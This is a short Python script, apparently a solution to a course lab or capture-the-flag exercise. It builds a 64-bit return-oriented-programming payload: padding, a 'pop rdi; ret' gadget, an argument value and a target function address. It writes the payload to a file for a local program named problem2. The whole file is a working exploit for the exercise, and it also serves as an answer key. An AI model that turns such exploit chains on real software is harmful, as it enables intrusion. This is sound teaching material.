import struct

# 1. Padding 长度 (与 prob1 相同)
padding_len = 16 
padding = b'A' * padding_len

# 2. Gadget 地址: pop rdi; ret
pop_rdi_ret_addr = 0x4012c7

# 3. 目标参数值: 0x3f8
arg1_value = 0x3f8

# 4. 目标函数 func2 的地址
func2_addr = 0x401216

# 5. 构造 ROP 链 (64位小端序):[ Padding ] + [ pop_rdi_addr ] + [ 参数值 ] + [ func2_addr ]
payload = padding
payload += struct.pack('<Q', pop_rdi_ret_addr)
payload += struct.pack('<Q', arg1_value)
payload += struct.pack('<Q', func2_addr)

# 写入
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("已生成 ans2.txt，请运行 ./problem2 ans2.txt 进行验证")